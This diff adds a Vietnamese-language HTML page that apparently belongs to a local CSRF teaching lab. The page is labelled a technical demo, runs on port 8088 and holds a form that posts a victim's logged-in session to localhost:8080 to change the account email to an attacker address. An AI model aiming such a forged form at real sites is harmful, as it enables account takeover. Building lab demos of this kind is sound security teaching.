@@ -1,0 +1,41 @@
+<!doctype html>
+<html lang="vi">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Trang mô phỏng tấn công CSRF</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<main class="page">
+    <p class="warning">Trang minh họa kỹ thuật. Không phải website thật.</p>
+
+    <h1>Nội dung hấp dẫn</h1>
+    <p>Đây là một trang khác trên cùng máy, chạy ở cổng 8088. Trang không có quyền truy cập cookie của ứng dụng nhưng có thể gửi biểu mẫu tới ứng dụng ở cổng 8080.</p>
+
+    <section class="card">
+        <h2>Biểu mẫu gửi yêu cầu đổi email</h2>
+        <p>Khi người dùng đang đăng nhập, trình duyệt sẽ gửi cookie phiên kèm yêu cầu này.</p>
+
+        <form method="post" action="http://localhost:8080/account/email">
+            <label for="email">Email mới</label>
+            <input id="email" name="email" type="email" value="attacker@gocnho.example" required>
+            <button type="submit">Gửi yêu cầu</button>
+        </form>
+
+        <p class="hint">Sau khi gửi, quay lại ứng dụng và kiểm tra trang tài khoản.</p>
+    </section>
+
+    <section class="card">
+        <h2>Điều kiện thực hiện</h2>
+        <ul>
+            <li>Ứng dụng chạy tại <code>http://localhost:8080</code>.</li>
+            <li>Trang này chạy tại <code>http://localhost:8088</code>.</li>
+            <li>Tài khoản đang đăng nhập trong cùng trình duyệt.</li>
+        </ul>
+    </section>
+
+    <p><a href="http://localhost:8080/">Mở ứng dụng mục tiêu</a></p>
+</main>
+</body>
+</html>
